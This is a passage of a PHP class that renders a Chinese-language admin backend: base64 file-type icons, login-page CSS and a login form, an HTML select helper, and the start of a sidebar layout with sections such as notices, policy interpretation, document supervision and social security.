KSkpub2MEOdoaGyEUuch0fw4AB4+tX8pOf/DMz8MEHXyqFLnShSykxK2bF7JcvJZyl4MrKdXlu7oE61KHu7VulK13p6bSlgMNBcYpT3DRFQRRE4fFjtrOd7R8+XJqX5qV5dGQRjUbJTnayK3V3AjnkkBsYICc5ydnWhlrUonZ8nJd4iZd8PjWtptV0ICCiIiqiKytlskyWyaoqCxyLKadyKqfDcXMTKqmkurggL3nJa7PxHu/xXqFAGmmkVVZyhjOcOTvDFrawVShQL/VS79OnFrq8HBo0aKenSCONdKknHj3iBCc4USxShCIUqajgLGc5+/27KUxhivLyKwKNC40LjQt+v8iLvMi/fo1lLGM5k6EYxSj2+fNdh4CjHOXokydIIIFER4c6VIfq8N270o74bRmVPg7u4R7umZiwxtFmwzrWsU50WwI0SqM0+uAB2tGO9lzO6DP6jL43b+76oHu3H6uCS4n3O8bgAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTEwLTIzVDIzOjI4OjA1KzA4OjAwzBJUYgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0xMC0yM1QyMzoyODowNSswODowML1P7N4AAABGdEVYdHN2ZzpiYXNlLXVyaQBmaWxlOi8vL2hvbWUvYWRtaW4vaWNvbi1mb250L3RtcC9pY29uX2lpcW1oMjZ1a3VqL3Jhci5zdmcwNhqCAAAAAElFTkSuQmCC" ,
			"txt"  => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAe9JREFUSMfFlD9rKkEUxe9d3E0gFrJIioSAhZWFwsxaBQJJvoqKYGEaC2sTUkgKBbERa/0KNsZOlJnC2CqklyXI+AcMuSn26QOXfSGu8G6z7Myce39z9rAA/7nQa4NJJpkslVCiRFkoQB3qUD85OXQQ1ahGtfUaxzjG8dOTSImUSD0+egp4gzd4Y73mjDPOwmG/N01kE9lE9vKSc845//jYrmueigEMYGAYQgop5GzmF2ARW8QWsdnMceKvk4HdjTu8wzu9HhShCMWbGxAgQAA4xET/bt/tCiGEEHd3vwXbAVCIQhS6vkZA72B41u2tFyj1qEe98XjenDfnTcvyBNgJ/oRlk96kN+mLC3NkjszRaqUsZSlL04CAgMJhQEDA93ca0pCGn59Sk5rUdN3FFoQgBAGi1Wg1WnWH2JUBzGEOc6enhmEYhmHbzuCHB2pTm9ovL9vBu/NJTGIyENg6sP9kiimm3t5+/ASHll8HfAPsO+AC/G0GXA0qVKFKoQARiEAk4M7MsRxAhQrV66vzdn+/W89jHvOm6Ulogw12t+vXSVfxDM/wzNfXsfptHWB91mf91epHwfZgvBwvx8vn534BrKW1tJZXV/u/Yu8MaKCB9vysT/SJPplOHeHZ2aEA1KIWtZTCKU5xWiody1nf9Q0pkAHDEetNngAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxOS0xMC0yM1QyMzoyODowNSswODowMMwSVGIAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTktMTAtMjNUMjM6Mjg6MDUrMDg6MDC9T+zeAAAARnRFWHRzdmc6YmFzZS11cmkAZmlsZTovLy9ob21lL2FkbWluL2ljb24tZm9udC90bXAvaWNvbl9paXFtaDI2dWt1ai90eHQuc3Zn+H+JSwAAAABJRU5ErkJggg==" ,
			"xml"  => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAzRJREFUSMfFlFFImm0Ux/8njZmWuouF7qKL0Kt24/u+vDIaAxHGroxBIORGc4PBKCJwxDDQG2ElMkaMNfFCCGLQzbqQQcvmjBxj+eaKXRhJY7HroUljBr5nFy99H3win/sIvv/V8/zhnPM75zk8wP8s+qchCqIgCqkUPPDA43J1nMkCCyzlcs1as9as9+9XpipTlalG488BZsQZcWZzk/qoj/oSCbjgguvLl39LpJbVslqenUU/+tFvtx9Xj6vH1Vu3OgVpARAEQRAEUew0TggLYSH89KkoiqIofvsmLAlLwtKbN44Fx4Jj4cKFdnFdHZP9kXZ2iIiIRNFsNVvN1tev24Hoz61mL3rR++4dpznN6WvXNHN/n4IUpKDNZoEFFiSTmn/3bguAtnxuNzawgQ2rVetAlqWMlJEyFy92RvHrF45whKNs9sxhMBhOp3Z7+FBySk7JKcvFg+JB8eDTp78AOM95zi8uwgADDJcv0xqt0dq9exzlKEclicMc5vCHD6QnPelNJg3UZEIBBRQcDkQQQWR3F+tYx/qlSxzjGMe+fiUQCMPDZ3XUhJpQE8+fYwQjGJHl1idQoEAxmRBFFNE7dzTz8WOkkELq5Uvaoz3au3qV7Wxn++fPvM3bvP32rc6v8+v8N282h5pDzaHZWfKSl7zPnmnxlUq7mbUsIU3QBE0YDNrtyRNFURRFCQYxiUlMLi6qRtWoGqvV7tXu1e7Vjx8pTnGKp9MNuSE35HodPvjgq1Y7XZ32S1hEEcXdXVESJVGy2bjMZS7v7FCGMpT58eN08HTwdNDn6zH3mHvMoRAN0AAN3L6tulW36q7VOgVomQBv8RZvHR5SjGIUe/WK53me5wsFfV6f1+djMYxhDGOHhxSiEIUePDgJnAROAjYbJznJyRs3aJqmabparY3Xxmvj378zMzNLEvzww//iRcvEzw7CirAirLx/j1GMYnR4GCpUqD9/0jIt03Kz2WlHLQ0FOMABnQ5d6EKX0UhhClN4c1OZU+aUOa/33L7itiqhhNKVK1znOtcfPVLiSlyJX7/efgeyyCK7v88e9rAnEkEOOeT+c/m/lUMOuVLpHDKdr34D0s5fFZVsEY0AAAAldEVYdGRhdGU6Y3JlYXRlADIwMTktMTAtMjNUMjM6Mjg6MDUrMDg6MDDMElRiAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE5LTEwLTIzVDIzOjI4OjA1KzA4OjAwvU/s3gAAAEZ0RVh0c3ZnOmJhc2UtdXJpAGZpbGU6Ly8vaG9tZS9hZG1pbi9pY29uLWZvbnQvdG1wL2ljb25faWlxbWgyNnVrdWovWE1MLnN2ZzWEv/oAAAAASUVORK5CYII=" ,
			"zip"  => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAnlJREFUSMfFVU0odGEYPQddCz9DSSykhpKN8r6LCWGKWbCwmVGSnQmZJmRnFiz8zEKGpImtbEwmK5qNpkSUuWxsLWQj9pi4z7cYo8zXfEbRd3b3vud5zrnvfX6IdyillFIjI2xjG9tmZmDAgPH4iFzRjW50h8MIIIBAY6P0SZ/0FRbWXddd111PTkYikUgk8vaWGcZMA+ln0zRN09zaytnAO/SNvtE3m5voRz/6i4vFJz7xFRcbLsNluAYGzmrOas5qnp7S/LzvCuQKERGRlRVucIMb0WiyKFmULDo40EorrWy2XzfADnawY3sbTjjh9Pvpoouu5mYsYAELHk+aV/DTwgl7wp6wj45mvv/4xQEEEMjP//UbyBX/3QD1tJ7W0xcXSCKJZEXFx8l32/ArZMlfgDjiiGv9V0AYYYQTCRmTMRmLxbjMZS4/P9NNN91VVRKTmMQcDkQRRbSsDEtYwtLxMTvZyc7bW8treS3vywtNmjQDAZziFKe1tZ9FamuptdZai3z5BfOYx7zXKw5xiGNoiK985evVFXrQg57KSituxa343h4NGjRWV9nKVrY+PEAgkGAQBMHd3cy0OdbA/j6HOczh0tJUOzmdWalHOMJRMChucYt7dlY84hFPV1c2etY2lJCEJHR/z3a2s31tzTq3zq3zw0P66KPvH15b0IKWwUHYYIOtqYl++ukvKfm2AU5xilPRKHawgx2bDeMYx/jEhChRoqqrU0XV0MAQQwyVl/OSl7y021PR9fWp+OzCHzo518BvQ9/pO33X26vm1JyaW1//6fzpSZi59PiZlpeXWhabm6mqVSo1y3/ght7ngJzIiZwsLqa37R9Ngf+xMu1zrQAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxOS0xMC0yM1QyMzoyODowNSswODowMMwSVGIAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTktMTAtMjNUMjM6Mjg6MDUrMDg6MDC9T+zeAAAARnRFWHRzdmc6YmFzZS11cmkAZmlsZTovLy9ob21lL2FkbWluL2ljb24tZm9udC90bXAvaWNvbl9paXFtaDI2dWt1ai96aXAuc3ZnlUqF6AAAAABJRU5ErkJggg==" ,
		];
		return $type_array[$type];
	}

	public function loginCss () {
		$login_css_style = <<<EOF
<style type="text/css">body{background-size:100% 100%;no-repeat;font-family:'PT Sans',Helvetica,Arial,sans-serif;text-align:center;color:#333}.page-container{margin:120px auto 0 auto}h1{font-size:30px;font-weight:700;text-shadow:0 1px 4px rgba(0,0,0,.2)}form{position:relative;width:305px;margin:15px auto 0 auto;text-align:center}input{width:270px;height:42px;margin-top:25px;padding:0 15px;background:rgba(255,255,255,.15);border-radius:6px;border:1px solid rgba(255,255,255,.15);box-shadow:0 2px 3px 0 rgba(0,0,0,.1) inset;font-family:'PT Sans',Helvetica,Arial,sans-serif;font-size:14px;color:#333;text-shadow:0 1px 2px rgba(0,0,0,.1);transition:all .2s}input::-webkit-input-placeholder{color:#333}input:focus{outline:0;box-shadow:0 2px 3px 0 rgba(0,0,0,.1) inset,0 2px 7px 0 rgba(0,0,0,.2)}button{cursor:pointer;width:270px;height:44px;margin-top:25px;padding:0;border-radius:6px;border:1px solid #333;box-shadow:0 15px 30px 0 rgba(255,255,255,.25) inset,0 2px 7px 0 rgba(0,0,0,.2);font-family:'PT Sans',Helvetica,Arial,sans-serif;font-size:14px;font-weight:700;color:#333;text-shadow:0 1px 2px rgba(255,255,255,.1);transition:all .2s}button:hover{box-shadow:0 15px 30px 0 rgba(255,255,255,.15) inset,0 2px 7px 0 rgba(0,0,0,.2)}button:active{box-shadow:0 5px 8px 0 rgba(0,0,0,.1) inset,0 1px 4px 0 rgba(0,0,0,.1);border:0 solid #333}</style>
EOF;
		self::htmlOut($login_css_style);
	}

	public function htmlLogin () {
		self::htmlOut("<html lang='en'><head><title>后台管理系统</title>");
		self::loginCss();
		self::htmlOut("</head><body><div class=\"page-container\"><h1>后台管理登陆</h1><form method=\"post\"><input type=\"text\" name=\"username\" class=\"username\" placeholder=\"用户名\"><input type=\"password\" name=\"password\" class=\"password\" placeholder=\"密码\"><button type=\"submit\">登录</button></form></div></body>");
	}

	public static function htmlSelect ($array , $mode = '' , $change = '' , $name = 'class') {
		$str = "<select name=$name $change>";
		foreach ($array as $name => $value) {
			if ($name == $mode) {
				$str .= "<option value=\"$name\" selected>$value</option>";
			} else {
				$str .= "<option value=\"$name\">$value</option>";
			}
		}
		$str .= "</select>";
		return $str;
	}

	public function htmlMain ($content) {
		$main_html = <<<EOF
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>后台管理系统</title>
    <style>
html,body{height:100%;overflow:hidden;}body,html,ul,li,a{padding:0;margin:0;text-decoration:none;}textarea{padding:10px;border-radius:4px;font-size:16px;border:1px solid #CCC;line-height:24px;color:#333;outline:none;box-sizing:border-box;resize:none;}select{height:40px;margin:0 5px;outline:none;background:#fff;border:1px solid #ccc;font-size:14px;vertical-align:middle;color:#333;line-height:40px;}input[type=text]{box-sizing:border-box;height:40px;padding:6px 12px;font-size:17px;line-height:1.42857143;color:#555;background-color:#fff;background-image:none;border:1px solid #ccc;border-radius:4px;outline:none;vertical-align:middle;}input[type=text]:focus,textarea:focus{box-shadow:0 0 8px rgba(51,51,51,.6);}input[type=submit]{height:40px;padding:6px 12px;line-height:1.42857143;color:#555;background-color:#fff;background-image:none;border:1px solid #ccc;border-radius:4px;outline:none;vertical-align:middle;width:100px;cursor:pointer;font-size:14px;}.main{height:100%;}.left{position:absolute;top:0;left:0;width:280px;height:100%;max-height:100%;background-color:#fff;overflow:auto;}.left::-webkit-scrollbar{display:none;}.nav{}.left .title{height:65px;line-height:65px;text-align:center;background-color:#fff;color:#333;font-size:20px;font-weight:bold;}.nav ul{list-style:none;}.nav ul li{background-color:#fff;}.nav ul li a{display:inline-block;padding:0 30px;height:60px;line-height:60px;font-size:0;width:100%;box-sizing:border-box;position:relative;text-decoration:none;}.nav ul li a:hover{text-decoration:none;box-shadow:0px 0px 5px #333 inset;}.nav ul li a:hover img{animation:IconRotate 0.5s forwards;}@keyframes IconRotate{from{-webkit-transform:rotate(0deg);-moz-transform:rotate(0deg);-o-transform:rotate(0deg);transform:rotate(0deg);}to{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg);}}.nav ul li a img{width:30px;height:30px;margin-right:10px;vertical-align:middle;float:none;}.nav ul li a span{color:#333;font-size:18px;vertical-align:middle;}.nav .sen-nav{background-color:rgb(46,46,46);height:0px;overflow:hidden;transition:height 0.5s;}.nav .next{position:absolute;right:10px;top:25px;width:10px;height:10px;}.nav .sen-nav li{height:60px;line-height:60px;background:#fff;}.nav .sen-nav li a{display:inline-block;padding-left:90px;box-sizing:border-box;height:60px;line-height:60px;color:#000;font-size:18px;text-decoration:none;overflow:hidden;}.nav .sen-nav li a:hover{text-decoration:none;box-shadow:0px 0px 5px #000 inset;}.havanexta{background:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA+ElEQVRYR+2UPRJBMRRGz7MHu6BRKDQYhUahMLaD9WANrEKl0CgoFBqFxtyZZMYQyU1i5jVJk1fcd7+Tk5+KmkdVcz4FoBgoBooBn4EBcAUOf3ispNfe1ccHsAOawDwTYgksgKELwgfQBjbAMwPChq8A+f4aoUPYAdbAIwEiGC40IQCp6RoT9wgIVbgWQOp6BuKmgFCHxwBIbd9AXDwQUeGxAFI/MhBnB4QNl1kOnWpozsBnozGwBU5vEEnhKQYszMSYOJpZ7nnUym2jFAP236kx0TDKnfc8tA85ANJ7BrR+PTKh8Jwt0PRW1eQaUIX4igpAMVAMFAMv2K0xIZKox6AAAAAASUVORK5CYII=') 220px center no-repeat;background-size:30px 30px;}.right{padding-left:280px;height:100%;padding-top:65px;overflow:auto;padding-bottom:65px;box-sizing:border-box;}.right::-webkit-scrollbar{display:none;}
    </style>
</head>

<body>
    <div class="main">
        <div class="left">
            <div class="title">后台管理系统</div>
            <nav class="nav">
                <ul>
                    <li>
                        <a href="?">
                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgEAYAAAAj6qa3AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAnFJREFUaN7tmD9r6lAYh99zki9QcGqFgtDOShRRRKSCdOjuJ9B0ciwd3FropIKLSGcHKXVyKC7tIIrIwUyltLRQkEIHKRUHafW8HbzxXhTR+CfR2/wW8eRn8j4PwRwCYMbMrw7R+4Kupqvpau7v8yqv8mqxqK5TD/VQz9FR3Vq31q2Pj/+dAHvMHrPH9vYEt+AW3Le3kIQkJHd21OOYwhSm3t85cOBwcKD4Fb/iv7/feAHTwEejt4iVCdAKbpSIpQtYFFxvEUsTsGxwvUQsLGDV4KsWMbcAvcFXJUKzAKPBly1iZgHrBr4sEVMFrDv4oiImCtg08HlFjAkYgnOBC/zuDqpQher2ttFAc8cDHvC8vfVpn/ZpIKCklbSSfnpSD4ujfRqkQRoMBDCEIQx1u4PVl5ehMR/xEZ/NZjTXpGAZy1j+O++Qq0RLtBQIQBrS8I8AzU8BSZIkSUI0GnRSGGOMMUEYfON8Wp8aPbDRMQXodSGsYQ1r7TbKKKN8fQ0ICHh1pX4O1wEA4PNTr7nExU8xW0iHdEgnm2VRFmXRk5OxQhSiEFX/Yy4uBounp6ueS787II5xjH99TS1GIAKRGXqbJmBdYwrQ+gPMYAYz/b7Rg49FBhlk9bk/+z5F+x3Qgha0Hh6M5h2LBSxgUedaoQCaozmaOz8HCSTQsiPsQhe6399TeyKIIM7QU/NnDlIgBVI4O9PKM/cbIUfFUXFUDg+pSEUqRiKQhzzkd3dHeyihhNLHB0mQBEkcHw+2qs/Pk87rLDqLzqLNxtu8zdvZLGGEEba1NVYMQxjCr6+8x3u8d3nZ8Da8De/Nzbw8Zsz80vwAleC26Xk3Y70AAAAldEVYdGRhdGU6Y3JlYXRlADIwMTktMTAtMjJUMjI6NTA6MDMrMDg6MDDm0Hw7AAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE5LTEwLTIyVDIyOjUwOjAzKzA4OjAwl43EhwAAAEl0RVh0c3ZnOmJhc2UtdXJpAGZpbGU6Ly8vaG9tZS9hZG1pbi9pY29uLWZvbnQvdG1wL2ljb25faWVsa3E0bTFnZGkvc2hvdXllLnN2ZxCCgbMAAAAASUVORK5CYII="
                                alt="">
                            <span>首页</span>
                        </a>
                    </li>
                    <li>
                        <a href="javascript:;" class="havanexta">
                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgEAYAAAAj6qa3AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAwZJREFUaN7tmc1LKlEYh99zLAijIlpY4cYgWsQsEicq+oCIIlIXQURBtizByIha5La2LQL/gGglQlAWZbSxRUVKyYi0iFoZSCbRIpN05r0Lr/dyE6uprqfbnWd55p057++ZjzPMACgoKPzPELk78BE+wkeqqkRRFEVxeRlqoAZqentJK2klrdXVf1YnEmACE5i2tnAJl3BpfZ0O02E6HA6n1lJrqbVIJFtZPFY8Vjym1UouySW5GhuJgziIY3AQPOABj9GYqVKrs/V4hEd4FI1m5vV66QbdoBuzs36tX+vXxuOfLqDZ1GxqNul0aVfalXbt7JAO0kE6GhoKebZeBAEBLy/FdrFdbO/vD64EV4IrFxcfFsDreB2v43lxVVwVVz0eMkNmyIxGwzpvXg/HeIzH8ThN0RRNmc0BdUAdUB8eyhagX9Av6Bf6+sAIRjC63WSKTJGpsjLWAd8MDzzwDw/SvDQvzY+MnNWd1Z3VeTyvCtDb9Da9rbsbLGABy94esRIrsapUrPO8F/SjH/3pNA3TMA339AS4ABfgfL7s9qIcI6NklIza7WAFK/zDwX/l4QlP+KIiBAQEuz0z+lsAzdljF3ZhN51m3fhngxM4gROimCPo+YAhYUgYEm1tUolUIpX4fFmDrAO8O3j2FkjSJE12dT1/KOZcAdkC4iVe4p2cZB3gw3jBC97p6XyrwavLoKHeUG+ot9mwHMuxfHExM1pRwTrXy9zfYymWYqnDcXpwenB64HTmq5T5Jkhp01XTVdPVwAAdokN0aHOTddQskltyS26zObPcbW//HJVeTSRzGkm1r9pX7X/Bh2QUohBNpd4a/J0Cvh+KANYNsEYRwLoB1igCWDfAGkUA6wZYI19ALdRCbfaN6wtxDddwLb8v2QKezp/On84FAZ3oRGcyyTo3nuAJnjw+ogY1qBGEvy5AmBPmhLmbGxBAAGF8PPM19va24MlboAVaYjEiEIEIFkuwM9gZ7IzF5B5G9n+BfHAcx3FcZWWh8odCoVAodHdXqPkUFL4pPwAx2D8Ai+CTtAAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxOS0xMC0yMlQyMjo1MDowMyswODowMObQfDsAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTktMTAtMjJUMjI6NTA6MDMrMDg6MDCXjcSHAAAAS3RFWHRzdmc6YmFzZS11cmkAZmlsZTovLy9ob21lL2FkbWluL2ljb24tZm9udC90bXAvaWNvbl9pZWxrcTRtMWdkaS9mdXpodWFuZy5zdmf/orwCAAAAAElFTkSuQmCC"
                                alt="">
                            <span>信息公开</span>
                        </a>
                        <ul class="sen-nav">
                            <li><a href="?action=xxgk">通告公告</a></li>
                            <li><a href="?action=zcjd">政策解读</a></li>
                        </ul>
                    </li>
                    <li><a href="?action=wjdc">
                            <img src="data:image/png;base64,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"
                                alt="">
                            <span>文件督查</span>
                        </a></li>

                    <li><a href="?action=shbz">
                            <img src="data:image/png;base64,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"
                                alt="">
                            <span>社会保障</span>
                        </a></li>
                    <li><a href="?action=zxft">
